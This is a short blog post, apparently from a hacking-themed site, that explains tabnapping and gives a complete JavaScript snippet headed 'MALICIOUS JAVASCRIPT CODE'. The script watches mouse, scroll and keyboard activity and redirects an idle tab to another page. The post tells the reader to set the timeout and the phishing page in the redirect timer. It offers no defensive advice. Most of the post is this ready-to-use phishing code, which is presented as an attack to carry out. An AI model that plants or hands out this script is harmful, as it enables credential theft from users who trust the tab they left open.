---
layout: post
title: "TABNAPPING ATTACKS"
date: 2020-12-01T23:54:00+05:30
categories: ["Hacking"]
description: "When there is no activity in a tab (NAP) a malicious code is executed that can be used for a phishing attack. Original page is then redirected to another fake page which is under"
original_url: "https://blog.alphathreat.in/index.php?post/2020/12/01/Tabnapping-Attack2"
---

*When there is no activity in a tab (NAP) a malicious code is executed that can be used for a phishing attack. Original page is then redirected to another fake page which is under the hackers control*

This attack is performed by monitoring the inactivity in a webpage, if it is idle or not used for some particular time period , the original page is redirected to a malicious page or a phishing page. Things that are checked in this attack are

- Check for mouse movement
- Check for scroll bar movement
- Check for keystrokes

If any of the above event is not triggered for few seconds , this means user is not using that tab, either is away from system or using other tab, so if these conditions are met, then we redirect it to our malicious page.

### **MALICIOUS JAVASCRIPT CODE**

```

<script type="text/javascript">
var xScroll, yScroll, timerPoll, timerRedirect, timerClock;
function initRedirect(){
  if (typeof document.body.scrollTop != "undefined"){ //IE,NS7,Moz
    xScroll = document.body.scrollLeft;
    yScroll = document.body.scrollTop;
    clearInterval(timerPoll); //stop polling scroll move
    clearInterval(timerRedirect); //stop timed redirect
    timerPoll = setInterval("pollActivity()",1); //poll scrolling
    timerRedirect = setInterval("location.href='http://www.gmail.com'",10000); //set timed redirect
  }
  else if (typeof window.pageYOffset != "undefined"){ //other browsers that support pageYOffset/pageXOffset instead
    xScroll = window.pageXOffset;
    yScroll = window.pageYOffset;
    clearInterval(timerPoll); //stop polling scroll move
    clearInterval(timerRedirect); //stop timed redirect
    timerPoll = setInterval("pollActivity()",1); //poll scrolling
    timerRedirect = setInterval("location.href='http://www.gmail.com'",10000); //set timed redirect and redirect page
  }
  //else do nothing
}
function pollActivity(){
  if ((typeof document.body.scrollTop != "undefined" && (xScroll!=document.body.scrollLeft || yScroll!=document.body.scrollTop))
   ||
   (typeof window.pageYOffset != "undefined" && (xScroll!=window.pageXOffset || yScroll!=window.pageYOffset))) { //other browsers
     initRedirect(); //reset polling scroll position
  }
}
document.onmousemove=initRedirect;
document.onclick=initRedirect;
document.onkeydown=initRedirect;
window.onload=initRedirect;
window.onresize=initRedirect;
</script>
```

Make sure to set the timeout and redirection page in **timerRedirect**
